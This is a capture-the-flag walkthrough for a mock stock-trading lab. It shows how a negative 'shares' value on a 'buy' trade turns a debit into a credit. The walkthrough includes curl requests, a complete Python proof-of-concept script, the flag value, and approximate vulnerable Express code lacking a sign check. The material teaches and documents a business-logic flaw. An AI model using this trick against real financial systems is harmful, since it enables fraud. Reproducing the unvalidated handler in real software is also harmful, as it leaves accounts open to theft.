# shadyoaks-006 - BugForge Lab Walkthrough

**URL:** https://lab-1786186802755-rw97up.labs-app.bugforge.io
**Difficulty:** Easy
**Vulnerability:** Business Logic - negative-quantity trade flips a debit into a credit
**Flag:** `bug{CQ6ZHLup7adX0UCNH3V1n70YxVm9wfRq}`

---

## Summary

Shady Oaks Financial is a mock stock-trading SPA. The `POST /api/trade` endpoint computes
`total_cost = price * shares` and applies that value to the user's balance the same way
regardless of sign - for a `"buy"` action it is supposed to subtract `total_cost` from the
balance, but since `shares` is never validated as positive, submitting a large negative `shares`
value flips `total_cost` negative as well, and subtracting a negative number credits the account
instead of debiting it. Pushing the balance across an internal "platinum" tier threshold causes
the trade response to include the flag directly.

---

## Tech Stack

- React SPA frontend
- Express.js (Node.js) backend
- JWT bearer auth (returned directly from registration, no login step needed)
- SQLite (or similar) backing store
- Stock catalog exposed at `GET /api/stocks`

---

## Key Endpoints

| Endpoint | Method | Auth | Notes |
|---|---|---|---|
| `/api/register` | POST | No | Self-service signup, returns a usable JWT directly |
| `/api/stocks` | GET | JWT | Lists tradeable stocks and their numeric ids |
| `/api/portfolio` | GET | JWT | Current holdings (empty for a new user) |
| `/api/trade` | POST | JWT | `{action, stock_id, shares}` - vulnerable endpoint |

---

## Discovery

### Step 1 - Register and map the trading surface

Registration returns a usable JWT directly:

```
POST /api/register {"username":"pentestXXXX","email":"...","password":"Password123!"}
-> {"token": "...", "user_id": ..., ...}
```

`GET /api/stocks` returns the tradeable catalog with numeric ids (id 1 through 5, tickers like
OAKLEAF, RISKIFY, etc). `GET /api/portfolio` confirms a fresh account starts with a fixed cash
balance and no holdings.

### Step 2 - Test the trade endpoint for missing quantity validation

Financial write endpoints (trade/transfer/order-style features) are a common place for apps to
trust a client-supplied quantity without re-deriving cost server-side or checking its sign. The
`/api/trade` endpoint takes `action`, `stock_id`, and `shares` in the request body, so the first
thing to test is whether `shares` is range/sign-checked at all.

An initial attempt guessed a `symbol` field (based on the ticker shown in the UI) instead of the
numeric id:

```
POST /api/trade {"shares":-1000000,"symbol":"AAPL"}
-> 400 Invalid stock_id format
```

The 400 immediately signals the correct field name is `stock_id`, and that it expects the numeric
id from `GET /api/stocks`, not a ticker symbol. Switching to a real `stock_id`:

```bash
curl -s -X POST https://lab-.../api/trade \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"action":"buy","stock_id":1,"shares":-1000000}'
```

Response:

```json
{
  "message": "Stock purchased successfully",
  "transaction_id": 4,
  "shares": "-1000000.0000",
  "price": 66.16,
  "total_cost": "-66160000.00",
  "new_balance": "66161000.00",
  "tier": "platinum",
  "flag": "bug{CQ6ZHLup7adX0UCNH3V1n70YxVm9wfRq}"
}
```

No sign or bounds check was ever applied to `shares` - the server accepted a negative quantity on
a `"buy"` action, computed a negative cost, and subtracted that negative cost from the balance,
crediting the account by over 66 million instead of debiting it. Crossing the platinum balance
tier triggered the flag directly in the trade response.

---

## Proof of Concept

```python
import json, urllib.request, urllib.error, time

BASE = "https://lab-1786186802755-rw97up.labs-app.bugforge.io"
H = {"Content-Type": "application/json"}

def req(method, path, data=None, token=None):
    url = BASE + path
    h = dict(H)
    if token:
        h["Authorization"] = f"Bearer {token}"
    body = json.dumps(data).encode() if data else None
    r = urllib.request.Request(url, data=body, headers=h, method=method)
    try:
        with urllib.request.urlopen(r, timeout=10) as resp:
            return resp.status, resp.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()

ts = str(int(time.time()))[-6:]
_, body = req("POST", "/api/register", {
    "username": f"pentest{ts}", "email": f"pentest{ts}@bugforge.io", "password": "Password123!"
})
token = json.loads(body)["token"]

# Get a valid stock_id
_, stocks = req("GET", "/api/stocks", token=token)
stock_id = json.loads(stocks)[0]["id"]

# Buy a large negative quantity - flips the debit into a credit
_, trade = req("POST", "/api/trade",
                {"action": "buy", "stock_id": stock_id, "shares": -1000000}, token=token)
print(trade)
# -> includes "tier": "platinum" and "flag": "bug{CQ6ZHLup7adX0UCNH3V1n70YxVm9wfRq}"
```

---

## Dead Ends

| Tried | Result | Lesson |
|---|---|---|
| `{"shares":-1000000,"symbol":"AAPL"}` | `400 Invalid stock_id format` | Field name and id format are app-specific - always pull the real stock list before trading, don't assume from other trading-app instances |

---

## Root Cause

The trade handler computes cost the same way for every trade and never validates the sign or
range of `shares` before applying it:

```javascript
// Vulnerable pattern (approximate)
app.post("/api/trade", authenticate, async (req, res) => {
  const { stock_id, shares, action } = req.body;
  const stock = await getStock(stock_id);
  const total_cost = stock.price * shares;

  const new_balance = action === "buy"
    ? user.balance - total_cost
    : user.balance + total_cost;

  await updateBalance(user.id, new_balance);
  res.json({ message: "Stock purchased successfully", shares, total_cost, new_balance, ... });
});
```

Because `shares` is never checked for `> 0`, a negative value makes `total_cost` negative too, and
`balance - total_cost` becomes an addition instead of a subtraction. The tier/flag-granting logic
then trusts the resulting balance without sanity-checking how it was reached.

---

## CWE / OWASP

- **CWE-841**: Improper Enforcement of Behavioral Workflow (business logic)
- **CWE-20**: Improper Input Validation (missing sign/range check on `shares`)
- **OWASP API Security Top 10** - API6:2023 Unrestricted Access to Sensitive Business Flows
